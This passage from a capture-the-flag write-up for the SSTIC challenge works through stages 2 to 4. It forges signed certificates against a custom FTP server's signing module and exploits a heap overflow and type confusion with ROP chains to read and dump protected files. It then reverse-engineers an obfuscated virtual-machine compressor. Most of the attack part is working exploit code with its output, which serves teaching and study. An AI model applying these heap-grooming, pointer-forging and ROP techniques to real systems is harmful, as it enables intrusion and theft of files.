send_cmd("DBG") # fails, need login

send_cmd("USER", "anonymous")
send_cmd("PASS", "xxxx")
send_cmd("USER", "EEEEFFFFGGGGHHHH")
send_cmd("DBG") # fails, need login
send_cmd("USER", "anonymous")

logf = pasv_cmd("RETR", "ftp.log")
leak1 = re.findall(b"(?s)User AAAABBBBCCCCDDDD(.+?) : Command", logf)[0]
leak2 = re.findall(b"(?s)User EEEEFFFFGGGGHHHH(.+?) : Command", logf)[0]
log.info("Leak 1: %s", leak1.hex())
log.info("Leak 2: %s", leak2.hex())

# Solve for keys
msg1 = u64(b"\x01anon\x00\x00\x00")
sig1 = u64(leak1[:8])
msg2 = u64(b"\x01anonymo")
sig2 = u64(leak2[:8])
ptrleak = u64(leak1[8:16])
assert ptrleak == u64(leak2[8:16]), "Sanity check fail"
exebase = (ptrleak & ~PAC_MASK) - 0x49c0

log.info("exe base: %#x", exebase)
log.info("Solving for keys with %#x=>%#x, %#x=>%#x", msg1, sig1, msg2, sig2)

res = subprocess.check_output(["sage", "hsm_solve.sage", str(msg1), str(sig1), str(msg2), str(sig2)])
keypairs = [tuple(map(int, row.split())) for row in res.strip().split(b"\n")]
for k1, k2 in keypairs:
    log.info("Candidate k1=%#x k2=%#x", k1, k2)

def sign(x, key=0):
    if isinstance(x, bytes):
        sig = 0
        for i in range(0, len(x), 8):
            chunk = u64(x[i:i+8].ljust(8, b"\0"))
            sig = crypt(chunk, sig, k1, k2)
        return sig
    return crypt(x, key, k1, k2)

def signptr(x, key=0):
    sig = sign(x, key)
    return x | (sig & PAC_MASK)

log.info("Test PAC: %x => %x (expected %x)",
    ptrleak & ~PAC_MASK, signptr(ptrleak & ~PAC_MASK), ptrleak)

# Get higher perms
for k1, k2 in keypairs:
    payload = b"perms=63&user=" + cyclic(0x60)
    sig = sign(payload)
    payload += b"&sig=%d" % sig
    resp = send_cmd("CERT", base64.b64encode(payload))
    if resp == "150 Ok":
        log.info("Confirmed k1=%#x k2=%#x", k1, k2)
        break
else:
    raise Exception("Failed to forge certificates...")

secret = pasv_cmd("RETR", "secret.txt")
log.info("Secret: %s", secret.decode())

s.interactive()
```

Running this script spits out the contents of [`secret.txt`](files/stage2/secret.txt), which translate to:

```
Great Guru Skippy,

I had access to information of the utmost importance concerning the earth's
topology.

I'm going back to shore to continue studying our magnificent plateau.

In the meantime, keep an eye out for skeptics who are beginning to uncover the
truth. We haven't finished building our barrier and people might fall, revealing
the true shape of our home.

Flatly,

Brother Bob

SSTIC{717ff143aa035b4da1cdb417b7f003f3}
```

along with our flag for stage 2!

## Stage 3

The FTP server, as written, won't let us `RETR` any filename that contains a slash, which rules out accessing the files under `sensitive`. To access these files, we'll have to properly exploit the FTP server to run our own code.

The main bug we will exploit is the heap overflow in `b64_decode` (bug 3, above). To make this easier, we will also leak a heap address using the type confusion bug (bug 1). Specifically, after logging in with a valid `CERT` command, we can send a 1024-byte line to cause `authtype` to be flipped to zero, causing the existing `Cert` object to be misinterpreted as a `User` object. The structures are as follows:

```
off   Cert (1)      User (0)
0     authed        authed
8     perms         perms
16    username      username[0:8]
24    sig           username[8:16]
32    computeSig    userSig
40    destructor    computeSig
```

The `char *username` pointer in `Cert` overlaps the `char username[16]` buffer in `User`, so when we flip `authtype` to zero, the `Cert.username` pointer bytes will be interpreted as the `User`'s username field. The username will be printed out in the debug log, thereby allowing us to leak a heap address.

Next, we need to groom the heap so that the `Cert` object will be allocated after the 512-byte buffer in `b64_decode`. We actually need to do this at the start before issuing any `CERT` commands, since the same 512-byte allocation will be reused for each call to `b64_decode`. Finally, by overwriting the `Cert` object using our heap buffer overflow, we can modify the `username` pointer in `Cert` to leak data or modify the `computeSig` function pointer to achieve code execution.

Therefore, the exploit plan is quite straightforward:

1. Groom the heap. By sending a `CERT` request with a 48-byte username (the same size as `Cert`), the username will be allocated after the 512-byte base64 buffer and subsequently freed, so it will be reused for future `Cert` allocations. We just send the following message right after connecting:

    ```
    # Groom heap
    payload = f"perms=0&user={'A' * 0x30}&sig=0"
    payload = payload.encode()
    send_cmd("CERT", base64.b64encode(payload))
    ```

2. Leak signatures and solve for the HSM signing keys as in stage 2
3. Log in with a valid cert (already done by the end of stage 2's exploit), send a 1024-byte input to set `authtype` to zero, and leak a heap address via the debug log
4. Log in with a valid cert again to allocate a `Cert` in the right place
5. Overflow from the base64 buffer into the `Cert` to overwrite the username with a GOT pointer; leak the resulting libc address via the debug log
6. `handleCertFTPServer` copies the part before `&sig=` into a stack buffer, and replaces newlines with null bytes. Use this to copy a ropchain into the stack. In the same payload, overflow from the base64 buffer in the `Cert` once more to overwrite the `computeSig` function pointer with a signed pointer to a gadget that will return into the ropchain.
7. When the login succeeds, the `computeSig` function pointer will get called to sign the perms+username. This calls our gadget, which will return into the ropchain that is already on the stack. In fact, a simple `pop; ret` gadget suffices because the stack buffer lies right at the bottom of the stack frame.

The leaked heap pointer turns out to be useful for constructing pointers to the base64 buffer, which can be used to insert additional data that is used by the ropchain (e.g. filenames).

Here's the new exploit code (full exploit in [`exploit3.py`](files/stage3/exploit3.py)):

```python
# Overflow input buffer by one to switch to User auth
send_cmd(b"TYPE", b"X" * (1024 - 6))
payload = b"perms=63&user=" + cyclic(0x30)
sig = sign(payload)
payload += b"&sig=%d" % sig
resp = send_cmd("CERT", base64.b64encode(payload))
logf = pasv_cmd("RETR", "ftp.log")

# Leak heap pointer from interpreting Cert.username (char *) as User.username (char[16])
heapleak = re.findall(b"Command CERT .+\nUser (......) : Command TYPE", logf)[-1]
heapleak = u64(heapleak.ljust(8, b"\0"))
heapbase = heapleak - 0x8010
log.info("heap base: %#x", heapbase)
inputaddr = heapbase + 0x5680
certaddr = heapbase + 0x5890

def setcert(authed=1, perms=0xff, username=certaddr):
    computeSig = signptr(exebase + 0x49c0) # use computeSigUser so we don't have to know what's at that address
    destructor = signptr(exebase + 0x56a0) # no-op to avoid freeing the object
    sig = sign(bytes([perms]) + p64(username)[:7])
    payload = b"X" * 0x208 + p64(0x41) + struct.pack("<QQQQQQ", authed, perms, username, sig, computeSig, destructor)
    send_cmd("CERT", base64.b64encode(payload))

# leak libc
setcert(username=exebase + 0x8e20) # getenv@got
logf = pasv_cmd("RETR", "ftp.log")
libcleak = re.findall(b"Command CERT .+\nUser (......) : Command PASV", logf)[-1]
libcleak = u64(libcleak.ljust(8, b"\0"))
libcbase = libcleak - 0x45ed0
log.info("libc base: %#x", libcbase)

payload_data = b""
def add_data(s):
    global payload_data
    payload_data = s + payload_data
    return inputaddr + 0x208 - len(payload_data)

pop_rdi = libcbase + 0x0007a307
pop_rsi = libcbase + 0x0007a0ff
pop_rdx_rcx_rbx = libcbase + 0x001025ad
cave = exebase + 0x9100
# fds: 0=stdin, 1=stdout, 2=stderr, 3=serial_port, 4=server_sock, 5=client_sock, 6=dbg
rop = [
    # open("sensitive/m00n.txt", 0)
    pop_rdi, add_data(b"sensitive/m00n.txt\0"),
    pop_rsi, 0,
    exebase + 0x22d0,
    # read(7, cave, 0x800)
    pop_rdi, 7,
    pop_rsi, cave,
    pop_rdx_rcx_rbx, 0x800, 0, 0,
    exebase + 0x21c0,
    # write(5, cave, 0x800)
    pop_rdi, 5,
    pop_rsi, cave,
    pop_rdx_rcx_rbx, 0x800, 0, 0,
    exebase + 0x20c0,
    0x4141414141,
]
payload = flat(rop) + b"perms=63&user=x"
sig = sign(payload)
payload = payload.replace(b"\0", b"\n") + b"&sig=%d&" % sig
payload = payload.ljust(0x208 - len(payload_data), b"X") + payload_data
assert len(payload) == 0x208
payload = payload + p64(0x41) + struct.pack("<QQQQQQ", 1, 0xff, certaddr, 0, signptr(pop_rdi), 0)
send_cmd("CERT", base64.b64encode(payload), reply=False)
secret = s.recvn(0x800)
log.info("secret: %s", secret.rstrip(b"\0").decode())

s.interactive()
```

Running this yields the [`m00n.txt`](files/stage3/m00n.txt) secret file (translated):

```
The other day I saw the little film we made at the time with Neil Armstrong.
It's crazy what we managed to do at the time!

When I see today's special effects, I tell myself that we were really
avant-garde...

PS: We have made good progress on securing our information exchange server. The
FTP server is operational as well as our hardware security module.

TODO:
     - Implement decompression
     - Use a less sensitive file than home_backup.tar for compression tests
     - Integrate the "goodfs" file system to the FTP server

SSTIC{f074370fa82189b5996228bb4a1df23d}
```

That's it for stage 3!

## Stage 4

It's not completely clear where to go now, so I just decided to use the new-found ability to ROP to explore the filesystem. I made a simple "stager" ropchain that read a longer ropchain into memory, and used that to load a ropchain to call `getdents64` on arbitrary directories. I also had the ropchain rerun the stager at the end, to enable interactivity. Here's how that looks ([`lsdir.py`](files/stage4/lsdir.py)):

```python
pop_rdi = libcbase + 0x0007a307
pop_rsi = libcbase + 0x0007a0ff
pop_rdx_rcx_rbx = libcbase + 0x001025ad
mov_rdx_rax = libcbase + 0x000425cf
pop_rsp = libcbase + 0x00054d0d
ropspace = heapbase + 0x10000
dataspace = heapbase + 0x18000
inc_rax = libcbase + 0x000cfb20

# fds: 0=stdin, 1=stdout, 2=stderr, 3=serial_port, 4=server_sock, 5=client_sock, 6=dbg
roploop = [
    # read(5, ropspace, 0x8000)
    pop_rdi, 5,
    pop_rsi, ropspace,
    pop_rdx_rcx_rbx, 0x8000, 0, 0,
    exebase + 0x21c0,
    # pop rsp
    pop_rsp, ropspace
]
payload = flat(roploop) + b"perms=63&user=x"
sig = sign(payload)
payload = payload.replace(b"\0", b"\n") + b"&sig=%d&" % sig
payload = payload.ljust(0x208, b"X")
assert len(payload) == 0x208
payload = payload + p64(0x41) + struct.pack("<QQQQQQ", 1, 0xff, certaddr, 0, signptr(pop_rdi), 0)
send_cmd("CERT", base64.b64encode(payload), reply=False)

@dataclass
class DirEntry:
    inode: int
    offset: int
    ftype: int
    name: str

def getdents(dirname):
    ropdata = b""
    offset = 0x200
    def add_data(x):
        nonlocal ropdata
        addr = ropspace + offset + len(ropdata)
        ropdata += x
        return addr

    rop = [
        # open(dirname, O_DIRECTORY)
        pop_rdi, add_data(dirname.encode() + b"\0"),
        pop_rsi, 0o0200000,
        exebase + 0x22d0,
        # rax = getdents64(7, dataspace, 0x8000)
        pop_rdi, 7,
        pop_rsi, dataspace,
        pop_rdx_rcx_rbx, 0x8000, 0, 0,
        libcbase + 0xde2d0,
        # write(5, dataspace, rax+1)
        inc_rax,
        mov_rdx_rax,
        pop_rdi, 5,
        pop_rsi, dataspace,
        exebase + 0x20c0,
        # write(5, "__END_DATA__", 12)
        pop_rdi, 5,
        pop_rsi, add_data(b"__END_DATA__"),
        pop_rdx_rcx_rbx, 12, 0, 0,
        exebase + 0x20c0,
        # close(7)
        pop_rdi, 7,
        exebase + 0x2190,
    ] + roploop
    rop = flat(rop).ljust(offset, b"\0")
    assert len(rop) == offset
    rop += ropdata
    s.send(rop)

    res = s.recvuntil(b"__END_DATA__", drop=True)
    recs = []
    ptr = 0
    while ptr < len(res) - 1:
        d_ino, d_off, d_reclen, d_type = struct.unpack_from("<QqHB", res, ptr)
        d_name = res[ptr+19:ptr+d_reclen].split(b"\0")[0].decode("latin1")
        recs.append(DirEntry(d_ino, d_off, d_type, d_name))
        ptr += d_reclen
    return recs

def dump_rec(dir, indent=0):
    recs = getdents(dir)
    for rec in recs:
        print(f"{'  '*indent}{rec.name} type={rec.ftype} inode={rec.inode}")
        if rec.ftype == 4 and rec.name not in (".", ".."):
            dump_rec(f"{dir}/{rec.name}", indent + 1)

dump_rec("/home")
```

This produces the following output:

```
. type=4 inode=14
.. type=4 inode=1
sstic type=4 inode=15
  . type=4 inode=15
  .. type=4 inode=14
  ftp.log type=8 inode=385
  sensitive type=4 inode=19
    . type=4 inode=19
    .. type=4 inode=15
    m00n.txt type=8 inode=22
    home_backup.tar.zz type=8 inode=21
    zz type=8 inode=20
  info.txt type=8 inode=18
  server type=8 inode=17
  secret.txt type=8 inode=16
```

Ah, there's a file `home_backup.tar.zz` which isn't in the release package we received. So, I wrote another "ROP loop" to dump the file ([`getfile.py`](files/stage4/getfile.py)):

```python
@dataclass
class Data:
    data: bytes

def send_rop(rop):
    ropdata = b""
    flat_roploop = flat(roploop)
    offset = 0x200
    def add_data(x):
        nonlocal ropdata
        if isinstance(x, Data):
            addr = ropspace + offset + len(ropdata)
            ropdata += x.data
            return addr
        else:
            return x

    rop = flat(rop, preprocessor=add_data)
    maxlen = offset - len(flat_roploop)
    assert len(rop) <= maxlen, "increase offset to at least %d" % (len(rop) + len(flat_roploop))
    while len(rop) < maxlen:
        # ret
        rop += p64(libcbase + 0x0007602d)
    rop += flat_roploop + ropdata
    s.send(rop)

outf = open("home_backup.tar.zz", "ab")
cursize = outf.tell()

send_rop([
    # open(filename, O_RDONLY)
    pop_rdi, Data(b"sensitive/home_backup.tar.zz\0"),
    pop_rsi, 0,
    exebase + 0x22d0,
    # fstat(7, dataspace)
    pop_rdi, 7,
    pop_rsi, dataspace,
    exebase + 0x56d0,
    # lseek(7, pos, 0)
    pop_rdi, 7,
    pop_rsi, cursize,
    pop_rdx_rcx_rbx, 0, 0, 0,
    libcbase + 0x000000000010e130,
    # write(5, dataspace, rax+1)
    pop_rdi, 5,
    pop_rsi, dataspace,
    pop_rdx_rcx_rbx, 0x90, 0, 0,
    exebase + 0x20c0,
    # write(5, "__END_DATA__", 12)
    pop_rdi, 5,
    pop_rsi, Data(b"__END_DATA__"),
    pop_rdx_rcx_rbx, 12, 0, 0,
    exebase + 0x20c0,
])
stat = s.recvuntil(b"__END_DATA__", drop=True)
log.info("stat: %s", stat.hex())
size, = struct.unpack_from("<Q", stat, 0x30)
log.info("filesize: %d", size)

while 1:
    chunksize = min(0x10000, size - outf.tell())
    send_rop([
        # read(7, dataspace, chunksize)
        pop_rdi, 7,
        pop_rsi, dataspace,
        pop_rdx_rcx_rbx, chunksize, 0, 0,
        exebase + 0x21c0,
        # write(5, dataspace, chunksize)
        pop_rdi, 5,
        pop_rsi, dataspace,
        pop_rdx_rcx_rbx, chunksize, 0, 0,
        exebase + 0x20c0,
        # write(5, "__END_DATA__", 12)
        pop_rdi, 5,
        pop_rsi, Data(b"__END_DATA__"),
        pop_rdx_rcx_rbx, 12, 0, 0,
        exebase + 0x20c0,
    ])
    res = s.recvuntil(b"__END_DATA__", drop=True)
    if not res:
        break
    log.info("%d bytes", len(res))
    outf.write(res)
```

For whatever reason, this would keep breaking after four iterations (262144 bytes), so I had to run it several times to get the whole file ([`home_backup.tar.zz`](files/stage4/home_backup.tar.zz)).

### Reversing zz

The `home_backup.tar.zz` file is clearly compressed with the mystery [`zz`](chall/initramfs/home/sstic/sensitive/zz) program from `/home/sstic/sensitive`. This program asks for a single filename and compresses it to `<filename>.zz`. We can, for example, compress a file with a single `x` character to get the following compressed file:

```
00000000: 1600 0001 0000 0400 0000 7800 0001 0000  ..........x.....
00000010: 0040 0000 0000 0000 00                   .@.......
```

Let's reverse the `zz` binary to see how it compresses files. First, the program executes a setup function at 0x1225 from `.init_array`, which allocates some memory at 0x11100000:

- 0x11100000 for 0x1000 bytes: RW memory, uninitialized
- 0x1111a000 for 0x1000 bytes: RW memory, copied from 0x10697
- 0x11111000 for 0x8000 bytes: RX memory, copied from 0x9250, with 0x3d bytes at 0x11118fc3 copied from 0x16c9

Then, the entrypoint at 0x1140 calls `__libc_start_main`, which calls `main` at 0x1379. Strangely, this function allocates a 0x4000 block of memory at 0xff550000, and then sets RSP to 0xff553ef8, pivoting the stack to this new chunk of memory. It pushes the old RSP, and restores it before returning.

Besides the weird stack pivot, `main` is otherwise pretty straightforward: it opens the file from the first argument, allocates a big block of memory at 0x20000 which is sized based on the input file, reads the entire file into the memory block, and calls the function at 0x2d4c. Upon returning from that function, it opens the `.zz` file and writes data from the memory block into that file, then quits.

The function 0x2d4c implements the entire compression algorithm. This function behaves very strangely. Here are the first few instructions:

```
2d4c:   lea rax, 0x1338c
        push rax
        call 5dd9
5dd9:   push rbp
        sub rsp, 0x40
        mov rbp, rsp
        jmp 7e44
7e44:   mov [rbp], edi
        mov [rbp+4], esi
        mov [rbp+8], edx
        mov [rbp+0xc], ecx
        jmp 4078
4078:   mov [rbp+0x10], r8d
        mov rsi, [rsp+0x50]
        mov ecx, rsp
        mov [rbp+0x38], ecx
        jmp 79b6
79b6:   sub esp, 0x100
        mov [rbp+0x28], esp
        mov edi, [rsi]
        lea rdx, [entry]
        add rdx, rdi
        jmp rdx
```

The code here is basically jumping between small "islands" of valid code interspersed with long sequences of meaningless bytes - it's obfuscated.

This code first makes room for 16 DWORDs on the stack at 0x5dd9 and stores the function's arguments to this space. It then allocates an additional 256 bytes of stack memory, then loads a DWORD from rsi = 0x1338c, offsets it by the address to the program entrypoint, and jumps to the resulting address. Note the use of a 32-bit `esp` register - this explains why the stack was pivoted to a 32-bit safe address.

The DWORD that is loaded is 0x4c29, making the resulting jump address 0x5d69. At this address, we find the following code:

```
5d69:   add rsi, 0x4
        xor rcx, rcx
        mov cl, [rsi]
        jmp 8d7c
8d7c:   add rsi, 0x1
        xor rbx, rbx
        mov bl, [rsi]
        add rsi, 0x1
        jmp 3d61
3d61:   xor rdx, rdx
        mov dl, [rsi]
        add rsi, 0x1
        mov ebx, [rbp+rbx*4]
        jmp 5385
5385:   mov ecx, [rbp+rcx*4]
        shl rdx, 2
        add rbx, rdx
        mov [rbx], ecx
        jmp 47f1
47f1:   mov edi, [rsi]
        lea rdx, [entry]
        add rdx, rdi
        jmp rdx
```

This advances rsi by 4 (skipping the DWORD that was loaded earlier), then loads the next three bytes as cl, bl and dl. These three bytes (which are 0, 10 and 12 at 0x13390) are then used to index `rbp` as follows:

```
ebx = [rbp+bl*4]
ecx = [rbp+cl*4]
[rbx+dl*4] = ecx
```

It then reads the next DWORD from `rsi`, offsets that by the entrypoint, and jumps to that new address.

This is, in fact, a virtual machine. rbp points to an array of 16 32-bit registers, while rsp points to a "memory" region of 0x100 bytes. rsi corresponds to the virtual machine's program counter. The VMs registers are initialized as follows: r0-r4 are initialized to the first five arguments to function 0x2d4c, r10 is initialized to point at the base of the 0x100-byte memory region, and r14 is initialized to point to the end of this region (also to the base of the register array).

Opcodes are encoded as the relative program address of their opcode handlers (e.g. the "opcode" 0x4c29 is handled by code at 0x4c29 + 0x1140 = 0x5d69), with each handler tail calling the next handler. Under this interpretation, the opcode 0x4c29 is basically just doing the following: `mov dword [rB + D*4], rC`, where `rB` and `rC` are VM registers and `D` is a constant operand.

To tackle this VM, I wrote a VM disassembler which uses Capstone to automatically follow and disassemble the handlers for unknown opcodes. I would read the disassembled handler code, implement the opcode in the VM disassembler, and rerun the disassembler to see the next unknown opcode's handler - rinse and repeat until all instructions are disassembled.

Here's my disassembler script, [`zzdisas.py`](files/stage4/zzdisas.py):

```python
# Automatically extract instructions from the weird machine

from capstone import *
from struct import unpack_from, calcsize

md = Cs(CS_ARCH_X86, CS_MODE_64)

f = open("zz", "rb")
prog = f.read()

def disas_op_impl(opaddr):
    rip = opaddr + 0x1140
    seen = set()
    while 1:
        if rip in seen: break
        seen.add(rip)
        for i in md.disasm(prog[rip:], rip):
            print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
            if i.mnemonic == "jmp":
                if i.op_str == "rdx":
                    return
                rip = int(i.op_str, 0)
                break

# - 0x1000 for file offset
#pc = 0x1338c
#pc = 0x13527 # from sub_0x2e9c
pc = 0x130c0 # from sub_0x2ccc

def rd(fmt):
    global pc
    res = unpack_from("<" + fmt, prog, pc - 0x1000)
    pc += calcsize("<" + fmt)
    return res

# rN = dword [ebp+N*4]
# r0..r4 = function arguments
# r10 = esp (0x100 space)

while 1:
    print(f"{pc:05x}:", end=" ")
    opcode, = rd("I")

    if opcode == 0x4c29:
        c, b, d = rd("BBB")
        print(f"[r{b}+{4*d}] = r{c}")
    elif opcode == 0x4ee7:
        c, b, d = rd("BBB")
        print(f"r{c} = [r{b}+{4*d}]")
    elif opcode == 0x6718:
        c, x = rd("BI")
        print(f"r{c} = {x:#x}")
    elif opcode == 0x634f:
        off, = rd("h")
        print(f"goto {pc+off:05x}")
    elif opcode == 0x4f23:
        c, b, d = rd("BBB")
        print(f"r{c} = r{b} < r{d}")
    elif opcode == 0x2e59:
        d, off = rd("BH")
        print(f"if r{d} == 0: goto {pc+off:05x}")
    elif opcode == 0x7153:
        c, b, d = rd("BBB")
        print(f"r{c} = r{b} - r{d}")
    elif opcode == 0x67b8:
        c, = rd("B")
        print(f"r14 = r14 - {4*c}")
    elif opcode == 0x68c5:
        imm, = rd("i")
        print(f"r0 = sub_{imm+0x1140:#x}(r0, r1, r2, r3, r4)")
    elif opcode == 0x4327:
        c, b, d = rd("BBB")
        print(f"r{c} = r{b} + {4*d}")
    elif opcode == 0x5299:
        c, b, d = rd("BBB")
        if d == 255:
            print(f"r{c} = r{b}")
        else:
            print(f"r{c} = r{b} + r{d}")
    elif opcode == 0x4cf5:
        print("return r0")
        break
    elif opcode == 0x5444:
        c, b, d = rd("BBB")
        print(f"r{c} = [r{b}+r{d}]")
    elif opcode == 0x769b:
        c, b, d = rd("BBB")
        print(f"r{c} = [r{b}+r{d}*4]")
    elif opcode == 0x5727:
        d, off = rd("BH")
        print(f"if r{d} != 0: goto {pc+off:05x}")
    else:
        print(f"UNK_{opcode:04x}")
        disas_op_impl(opcode)
        break
```

This produces readable VM disassembly that looks like this:

```
1338c: [r10+48] = r0
13393: [r10+44] = r1
1339a: [r10+40] = r2
133a1: [r10+36] = r3
133a8: r0 = [r10+36]
133af: [r10+32] = r0
133b6: r0 = 0x10000
133bf: [r10+28] = r0
133c6: r0 = 0x0
133cf: [r10+24] = r0
133d6: goto 133dc
133dc: r0 = [r10+24]
133e3: r1 = [r10+40]
133ea: r0 = r0 < r1
133f1: if r0 == 0: goto 1350c
133f8: goto 133fe
133fe: r0 = [r10+28]
13405: r1 = [r10+40]
1340c: r2 = [r10+24]
13413: r1 = r1 - r2
1341a: r14 = r14 - 4
1341f: r0 = sub_0x28fa(r0, r1, r2, r3, r4)
13427: r14 = r14 + 4
1342e: [r10+20] = r0
13435: r0 = [r10+36]
1343c: [r10+16] = r0
13443: r0 = [r10+36]
1344a: r1 = 0x3
13453: r0 = r0 + r1
1345a: [r10+36] = r0
13461: r0 = [r10+48]
13468: r1 = [r10+44]
1346f: r2 = [r10+24]
13476: r3 = [r10+20]
1347d: r3 = r2 + r3
13484: r4 = [r10+36]
1348b: r14 = r14 - 4
13490: r0 = sub_0x2e9c(r0, r1, r2, r3, r4)
13498: r14 = r14 + 4
1349f: [r10+12] = r0
134a6: r0 = [r10+16]
134ad: r1 = [r10+12]
134b4: r14 = r14 - 4
134b9: r0 = sub_0x1a57(r0, r1, r2, r3, r4)
134c1: r14 = r14 + 4
134c8: r0 = [r10+12]
134cf: r1 = [r10+36]
134d6: r0 = r1 + r0
134dd: [r10+36] = r0
134e4: goto 134ea
134ea: r0 = [r10+28]
134f1: r1 = [r10+24]
134f8: r0 = r1 + r0
134ff: [r10+24] = r0
13506: goto 133dc
1350c: r0 = [r10+36]
13513: r1 = [r10+32]
1351a: r0 = r0 - r1
13521: return r0
```

Here, `r10` acts like the `rbp` register, providing access to the 0x100-byte chunk of memory allocated earlier, so we can treat `[r10+X]` memory references as "stack" variables. By giving these variables useful names, and simplifying some instruction sequences (e.g. `r0 = [r10+28]; r1 = [r10+24]; r0 = r1 + r0; [r10+24] = r0` becomes simply `[r10+24] += [r10+28]`), we wind up with code that looks like this:

```
1338c: state = r0
13393: fileptr = r1
1339a: filesize = r2
133a1: outptr = r3
133a8: outbase = outptr
133b6: chunksize = 0x10000
133c6: filepos = 0x0
133d6: goto 133dc
  133dc: if filepos >= filesize: goto 1350c

  1341a: [r10+20] = min(chunksize, filesize - filepos) # sub_0x28fa
  13435: lenptr = outptr
  13443: outptr = outptr + 3

  13461: r0 = state
  13468: r1 = fileptr
  1346f: r2 = filepos
  13476: r3 = r2 + [r10+20]
  13484: r4 = outptr
  1348b: r14 = r14 - 4
  13490: res = vmcall 13527(r0, r1, r2, r3, r4) # sub_0x2e9c
  13498: r14 = r14 + 4

  134a6: write24(lenptr, res) # sub_0x1a57

  134c8: outptr += res
  134ff: filepos += chunksize
  13506: goto 133dc

1350c: return outptr - outbase
```

This VM function calls three other functions from the `zz` binary. `sub_0x28fa` and `sub_0x1a57` are plain C functions: `sub_0x28fa` calculates the minimum of its two integer arguments, and `sub_0x1a57` writes a little-endian 24-bit integer to the given memory location. `sub_0x2e9c`, on the other hand, does this:

```
lea rax, 0x13527
push rax
call 5dd9
```

That is, this function is another VM function: it loads a different VM program and executes it using the same VM interpreter at 0x5dd9. So, we have to reverse that one too.

The [`main`](files/stage4/zzdisas.main.txt) VM function takes the input data 65536 bytes at a time and feeds each chunk to the `sub_0x2e9c` VM function ([`compress_chunk`](files/stage4/zzdisas.compress_chunk.txt)), which compresses that chunk and writes that to the output. `compress_chunk` calls a number of functions; the main ones are tagged `s01` through `s07` in the VM disassembly. These functions operate on the shared compressor state, and perform the bulk of the compression logic.

`s01` and `s02` locate matches within the text - subsequent identical runs of text that will be compressed into a (distance, length, literal length) tuple referencing the earlier match. This is a typical [dictionary coder](https://en.wikipedia.org/wiki/Dictionary_coder) approach as used by the Lempel-Ziv family of compression codecs (e.g. the widely-used Zlib). A hash table is used to efficiently identify matches. `s03`, `s04`, `s05` and `s06` use a Huffman coding scheme to compress the literal characters that aren't represented by any matches - `s03` initializes the tables, `s04` accumulates frequency counts for every literal, `s05` processes the frequency counts into Huffman codes by using a heap data structure, and `s06` writes literal codes to the output based on the computed Huffman tree.

For example, here's Ghidra's decompilation for `s05`:

```c
void s05_freq_process(state *s)

{
  undefined8 uVar1;
  heap_node *left;
  heap_node *right;
  heap_node *new_node;
  long lVar2;
  undefined8 *puVar3;
  heap_root heap;
  uint binptrs [256];
  int local_14;
  int i;
  int nbins;
  
  puVar3 = (undefined8 *)binptrs;
  for (lVar2 = 0x80; lVar2 != 0; lVar2 += -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  nbins = 0;
                    // compact by removing zero bins
  for (i = 0; i < s->huffman_nsyms; i += 1) {
    if (s->huffman_freq_heap[i].count_or_depth != 0) {
      uVar1 = *(undefined8 *)&s->huffman_freq_heap[i].left;
      *(undefined8 *)(s->huffman_freq_heap + nbins) = *(undefined8 *)(s->huffman_freq_heap + i);
      *(undefined8 *)&s->huffman_freq_heap[nbins].left = uVar1;
      binptrs[nbins] = (int)s + (nbins + 1) * 0x10;
      nbins += 1;
    }
  }
  heap._0_8_ = 0;
  heap.count2 = 0;
  heap_create(&heap,(int *)binptrs,nbins);
  for (local_14 = nbins; 1 < local_14; local_14 += -1) {
    left = heap_pop(&heap);
    right = heap_pop(&heap);
    new_node = s->huffman_freq_heap + (local_14 + nbins);
    new_node->count_or_depth = left->count_or_depth + right->count_or_depth;
    new_node->value = -1;
    new_node->left = (int)left;
    new_node->right = (int)right;
    heap_push(&heap,new_node);
  }
  heap_set_depth((heap_node *)(ulong)binptrs[0],(uint)(nbins == 1));
  state_sort_freq_heap(s,nbins);
  state_adjust_freq_depth(s,nbins);
  state_freq_write(s,nbins);
  state_set_huffman_codes(s,nbins);
  return;
}
```

From reversing these C functions, we can infer that the compressor state shared by most functions is stored in a large C structure that looks like this (note that all pointers are *32 bits in size*):

```c
struct state {
    /* Output bitstream state */
    byte *out_base;
    byte *out_ptr;
    uint out_bitaccum;
    int out_bitpos;

    /* Huffman coding state */
    struct heap_node {
        int count_or_depth;
        int value;
        heap_node *left;
        heap_node *right;
    } huffman_freq_heap[512];
    byte huffman_lengths[256];
    int huffman_codes[256];

    /* Match hash table */
    uint htbl_size;
    uint htbl_mask;
    int *htbl_table;
    int *htbl_chain;

    /* General state */
    int huffman_nsyms;
    int match_count;
    int literals_count;
    byte literals[65536];
    int match_offsets[16384];
    int match_lengths[16384];
    int match_literals[16384];
};
```

The VM code basically functions as a "driver" which calls the various C functions to do the real work. So, by reading the VM code, we can determine the structure of the output file. We already reversed the storage of literals (`s03` to `s06`). Three more functions called by `compress_chunk`, 0x2926, 0x2ccc and 0x2974, are passed the match literals, match offsets and match lengths respectively, and are presumably responsible for writing those to the file.

0x2974 is a normal C function which also calls `s03` through `s06`, so we know the match lengths are encoded using another Huffman tree scheme. A total of 32 symbols are defined; the first 16 codes mean lengths of 0-15 bytes respectively, while codes 16-31 indicate ranges of lengths (e.g. code 16 means lengths 16-31, code 17 means lengths 32-63, etc.). When encoded as Huffman codes, additional bits are appended if the code indicates a range of values (so, e.g. the code for 17 would be followed by 5 additional bits which would be added to 32 to yield the exact match length).

0x2ccc is another VM function ([`match_offsets`](files/stage4/zzdisas.match_offsets.txt)), and reversing it shows the same calls to `s03` to `s06`, so the match offsets are encoded using yet another Huffman tree with a similar range-encoding scheme (codes 0, 1 are exact offsets, codes 2-31 are power-of-two match ranges).

#### The 32-bit Surprise

0x2926, however, is not like the other functions called by the VM code. 0x2926 calls the function located at 0x11118fc3, which was copied by the `.init_array` code. This function does the following:

```
push rbx
push rbp
mov rbp, rsp
sub rsp, 0x18
mov rbx, rsp
lea rax, 0x11118fee
mov [rbx], rax
mov rax, 0x23
mov [rbx+4], eax
mov r13, rbp
call far [rbx]
mov rbp, r13
leave
pop rbx
ret
```

This code invokes the `call far` instruction, which performs a segment change before calling a particular address. In this case, the new segment, 0x23, specifies a 32-bit operating mode - this is an example of the "Heaven's Gate" technique, in which 64-bit code calls 32-bit code. This is the real reason why the stack and the compression state structure were allocated at 32-bit-safe addresses.

The 32-bit code does the following:

```
push 0x2b
pop ds
push 0x2b
pop es
call edi
retf
```

This sets up the correct segment registers to run normal 32-bit code. The actual function called is taken from the 64-bit function's argument (`edi`), which is 0x1111247b in this case.

The 32-bit code at 0x1111247b looks like this:

```
247b:   lea eax, [a12a]
        push eax
        call 7d66
